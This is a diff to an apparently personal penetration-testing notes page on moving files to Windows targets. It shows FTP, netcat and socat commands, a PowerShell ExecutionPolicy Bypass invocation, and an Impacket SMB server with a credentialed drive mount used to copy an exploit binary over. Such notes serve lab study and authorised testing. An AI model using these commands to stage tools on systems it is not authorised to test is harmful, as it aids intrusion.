@@ -1,5 +1,5 @@
 # Windows File Transfers
-Check out [[Kali-Windows-Resources]] for selection of binaries and such to transfer!
+Check out [[Kali-Windows-Resources]] for selection of binaries and such to transfer! Other methods for [[File-Transfers]].
 
 ## FTP download
 ```bash
@@ -9,6 +9,7 @@ sudo systemctl restart pure-ftpd
 ```
 
 ## Netcat
+[[Netcat-Cheatsheet]]
 ```powershell
 # Listener on Windows system
 nc -lvnp $PORT > tranfered.exe
@@ -17,7 +18,7 @@ nc -nv $IP $PORT < /usr/share/windows-resources/binaries/wget.exe
 ```
 
 ## Socat
-Host with
+Use [[Socat-Cheatsheet]], Host with:
 ```bash
 sudo socat TCP4-LISTEN:$PORT,fork file:$filename
 ```
@@ -53,6 +54,17 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 ```
 
 ## SMB with Impacket
+[[Impacket-Cheatsheet]]
+```bash
+impacket-smbserver scriptserver $(pwd) -smb2support -user user -password pass
+```
+On remote:
+```powershell
+$pass = convertto-securestring 'pass' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('user', $pass)
+New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP
+```
+
 ```bash
 python3 smbserver.py ROPNOP /path/to/exploit
 copy \$IP\ROPNOP\exploit.exe`
